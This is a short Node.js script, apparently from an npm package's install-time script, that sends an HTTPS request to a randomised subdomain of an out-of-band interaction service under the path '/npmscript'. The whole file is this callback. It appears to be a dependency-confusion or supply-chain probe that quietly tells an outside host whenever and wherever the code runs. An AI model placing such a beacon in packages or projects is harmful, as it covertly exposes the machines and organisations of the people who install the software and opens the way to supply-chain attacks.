const https = require('node:https')

const options = {
    hostname: 'e2h2kaun61g0amra7pleo317byhz5zto.oastify.com',
    path: '/npmscript',
    method: 'GET'
};

const req = https.request(options)
req.end();
